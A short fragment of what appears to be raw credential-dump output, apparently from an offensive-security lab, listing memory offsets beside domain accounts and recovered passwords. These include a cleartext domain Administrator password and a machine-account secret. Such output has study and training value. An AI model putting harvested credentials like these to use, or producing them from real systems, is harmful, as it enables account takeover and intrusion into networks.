   [00000000:00aeb773] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
   [00000000:00aebd86] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
   [00000000:00aebf6f] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
   [00000000:00af2311] CORP\Administrator  QWERTY123!@#
   [00000000:00404e84] CORP\Administrator  Šd
   [00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
   [00000000:00b174fa] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
   [00000000:00b177a7] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ >n*>&8?!5oz$mY%HV%gm=X&J6,w(FV[KL?*g2HbL.@p(s&mC?Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
   [00000000:00b1dd77] CLIENTWK245\offsec  lab
   [00000000:00b1de21] CLIENTWK245\offsec  lab
   ```


